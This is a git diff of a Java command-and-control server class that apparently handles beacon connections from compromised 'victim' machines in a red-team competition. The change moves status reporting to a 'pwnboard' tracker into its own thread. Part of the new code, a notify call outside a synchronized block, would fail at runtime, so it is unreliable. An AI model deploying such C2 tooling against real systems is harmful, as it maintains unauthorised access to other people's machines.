@@ -3,15 +3,12 @@ package Servers.Beacon;
 import Servers.Duplexer;
 import Servers.keepAlive;
 
-import java.io.DataOutputStream;
 import java.io.IOException;
-import java.io.InputStream;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
 import java.net.URI;
 import java.net.URISyntaxException;
 import java.net.URL;
-import java.util.Scanner;
 
 public class BeaconClientHandler implements Runnable{
     // IP address of the client
@@ -43,10 +40,12 @@ public class BeaconClientHandler implements Runnable{
     private Object shellLock;
 
     // Variables used to send HTTP Requests to pwnboard. pwnboard is used to keep track of what machines red team still has access to.
-    URI pwnboardUri = null;
-    URL pwnboardUrl = null;
-    HttpURLConnection pwnboardConnection = null;
-    String pwnboardData;
+    private URI pwnboardUri = null;
+    private URL pwnboardUrl = null;
+    private HttpURLConnection pwnboardConnection = null;
+    private String pwnboardData;
+    private Object pwnBoardLock;
+    private pwnBoardRequest pwnBoardRequestObject;
 
     /**
      * Use this Class to create a new thread to handle each victim connection
@@ -74,7 +73,11 @@ public class BeaconClientHandler implements Runnable{
         } catch (MalformedURLException e){
             e.printStackTrace();
         }
-        this.pwnboardData = "{\"ip\": \"" + IPAddress + "\", \"application\": \"Javalanche\", \"access_type\": \"beacon\"}";
+        //this.pwnboardData = "{\"ip\": \"" + IPAddress + "\", \"application\": \"Javalanche\", \"access_type\": \"beacon\"}";
+        this.pwnboardData = "{\"ip\": \"10.1.1.1\", \"application\": \"Javalanche\", \"access_type\": \"beacon\"}";
+        this.pwnBoardLock = new Object();
+
+        this.pwnBoardRequestObject = new pwnBoardRequest(pwnboardUrl, pwnboardConnection, pwnboardData, pwnBoardLock);
     }
 
     protected void quit(String reason) throws IOException{
@@ -110,35 +113,6 @@ public class BeaconClientHandler implements Runnable{
     }
 
     /**
-     * This method sends a HTTP request to pwnbaord. pwnboard keeps track of what machines we have access to in the competition, so this method is called
-     * Whenever a message is received from the client
-     */
-    private void sendPwnBoardRequest() throws IOException{
-        // Connect to pwnboard
-        pwnboardConnection = (HttpURLConnection)pwnboardUrl.openConnection();
-        pwnboardConnection.setDoOutput(true);
-        pwnboardConnection.connect();
-
-        // Send api request
-        DataOutputStream writer = new DataOutputStream(pwnboardConnection.getOutputStream());
-        
-        writer.writeBytes(pwnboardData);
-        writer.close();
-
-        // Debug lines
-        InputStream in = pwnboardConnection.getInputStream();
-        Scanner scanner = new Scanner(in);
-
-        while(scanner.hasNext()){
-            scanner.nextLine();
-        }
-        scanner.close();
-
-        pwnboardConnection.disconnect();
-
-    }
-
-    /**
      * Use this function to have the thread send a message to the client
      * 
      * @param message Message to be sent
@@ -158,19 +132,21 @@ public class BeaconClientHandler implements Runnable{
     public void run(){
         // Start the Thread to Send KEEP_ALIVE messages to the client every 30 seconds
         keepAliveThread.start();
+
+        // Create a new thread responsible for updating pwnBoard
+        Thread pwnBoardRequestThread = new Thread(pwnBoardRequestObject);
+        pwnBoardRequestThread.start();
+
         Boolean notify;
         while(sentinel){
             try{
                 notify = false;
                 String response = duplexer.receive();
-                // If sending pwnboard requests fail, this isn't really critical to javalanche's connection to the client,
-                // so we don't want to stop the main while loop, so this smaller try catch block is just for catching 
-                // exceptions related to sending pwnboard
-                // try {
-                //     sendPwnBoardRequest();
-                // } catch (IOException e){
-                //     System.out.println(IPAddress + " unable to update PWNBoard");
-                // }
+
+                // Every time a response is received, notify the pwnBoard lock, so that the thread will send a message to pwnBoard
+                // that we have an active connection with the agent.
+                pwnBoardLock.notify();
+
                 if(response != null){
                     if(!(response.equals("GET / HTTP/1.1")) && !(response.contains("Content-Length")) && !(response.equals("Content-Type: text/plain; charset=utf-8")) && !(response.equals("HTTP/1.1 200 OK")) && !(response.isBlank())){
                         response = encrypt(response);
